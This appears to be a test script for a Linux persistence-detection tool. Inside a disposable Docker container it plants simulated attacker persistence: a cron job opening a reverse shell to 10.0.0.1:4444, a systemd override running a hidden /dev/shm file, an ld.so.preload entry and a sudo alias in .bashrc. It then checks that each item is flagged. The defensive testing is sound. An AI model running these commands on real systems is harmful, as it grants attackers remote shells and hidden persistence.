#!/usr/bin/env bash
# Usage: ./tests/linux/test-autostart.sh   # needs docker
set -euo pipefail
cd "$(dirname "$0")/../.."
docker run --rm -v "$PWD":/s:ro ubuntu:24.04 bash -c "$(sed -n '/^# --- container ---$/,$p' "$0")"
exit
# --- container ---
set -eo pipefail
apt-get update -qq >/dev/null && apt-get install -y -qq cron >/dev/null 2>&1
useradd -m alice
cd /s/linux/hunt/continuous
echo "== stock image"
./get-autostart-findings.sh | grep -v '^INFO' || true
./get-autostart-findings.sh >/dev/null && echo "PASS stock exits 0" || { echo "FAIL stock rc=$?"; exit 1; }

echo "== plant Red persistence"
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'" > /etc/cron.d/sysupdate
echo "*/5 * * * * root /usr/local/bin/healthcheck" >> /etc/crontab
printf '[Service]\nExecStart=/usr/local/bin/dbus-helper\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/dbus-helper.service
ln -s /etc/systemd/system/dbus-helper.service /etc/systemd/system/multi-user.target.wants/dbus-helper.service 2>/dev/null || true
mkdir -p /etc/systemd/system/cron.service.d && printf '[Service]\nExecStartPost=/dev/shm/.x\n' > /etc/systemd/system/cron.service.d/override.conf
echo /usr/lib/libx.so > /etc/ld.so.preload
echo "alias sudo='sudo -E'" >> /home/alice/.bashrc
echo "@reboot /usr/local/bin/sync" | crontab -u alice -

rc=0; out=$(./get-autostart-findings.sh) || rc=$?
echo "$out"
ok=1
[[ $rc -eq 2 ]] || { echo "FAIL rc=$rc want 2"; ok=0; }
for want in $'FAIL\tcron\t/etc/cron.d/sysupdate' $'FAIL\tsystemd\t/etc/systemd/system/cron.service.d/override.conf' \
            $'FAIL\tloader\t/etc/ld.so.preload' $'FAIL\tuser-shell\t/home/alice/.bashrc' \
            $'WARN\tsystemd\t/etc/systemd/system/dbus-helper.service' $'WARN\tcron\t/var/spool/cron/crontabs/alice' \
            $'INFO\tcron-entry\t/etc/crontab\t*/5 * * * * root /usr/local/bin/healthcheck'; do
  grep -qF "$want" <<<"$out" && echo "PASS ${want//$'\t'/ }" || { echo "FAIL missing: ${want//$'\t'/ }"; ok=0; }
done
[[ $ok -eq 1 ]]
